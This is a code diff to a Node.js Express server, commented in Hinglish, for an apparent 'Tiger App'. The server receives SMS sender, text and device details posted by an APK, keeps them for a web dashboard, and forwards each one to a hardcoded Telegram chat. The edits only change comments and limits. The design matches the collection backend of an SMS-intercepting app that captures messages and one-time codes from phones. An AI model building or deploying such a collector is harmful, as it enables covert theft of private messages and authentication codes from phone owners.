@@ -4,7 +4,7 @@ const path = require('path');
 const app = express();
 
 app.use(express.json());
-// Dashboard access ke liye public folder
+// Dashboard file access karne ke liye
 app.use(express.static(path.join(__dirname, 'public')));
 
 // --- CONFIGURATION ---
@@ -14,10 +14,7 @@ const CHAT_ID = '7128071523';
 
 let smsLogs = [];
 
-/**
- * 1. Mobile App SMS Endpoint
- * APK isi address par SMS bhejegi
- */
+// 1. DEDICATED APP ENDPOINT: APK isi par data bhejegi
 app.post('/log-sms', async (req, res) => {
     try {
         const { sender, message, device, timestamp } = req.body;
@@ -25,16 +22,16 @@ app.post('/log-sms', async (req, res) => {
         const newEntry = {
             id: Date.now(),
             device: device || 'Tiger-Mobile',
-            sender: sender || 'Unknown Number',
-            message: message || 'Empty SMS',
+            sender: sender || 'Unknown',
+            message: message || 'No Content',
             time: timestamp || new Date().toLocaleString()
         };
 
-        // Portal/Dashboard ke liye save karein
+        // Dashboard/Portal ke liye memory mein save karein
         smsLogs.unshift(newEntry);
-        if (smsLogs.length > 500) smsLogs.pop(); // Memory limit
+        if (smsLogs.length > 200) smsLogs.pop(); // Memory clean rakhne ke liye
 
-        // Telegram par instant alert
+        // Telegram Notification
         const telegramMsg = `🐯 *Tiger App Alert!*\n\n` +
                           `📱 *Device:* ${newEntry.device}\n` +
                           `👤 *From:* ${newEntry.sender}\n` +
@@ -56,19 +53,18 @@ app.post('/log-sms', async (req, res) => {
     }
 });
 
-// 2. Dashboard ko data dene ke liye
+// 2. PORTAL DATA: Dashboard table ke liye
 app.get('/get-logs', (req, res) => {
     res.json(smsLogs);
 });
 
-// 3. Portal saaf karne ke liye
+// 3. CLEAR LOGS: Portal saaf karne ke liye
 app.post('/clear-logs', (req, res) => {
     smsLogs = [];
     res.json({ success: true });
 });
 
-// Default Port for Render
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-    console.log(`🚀 Tiger App Server is Live on Port ${PORT}`);
+    console.log(`🚀 Tiger APK-Only Server is Live on Port ${PORT}`);
 });
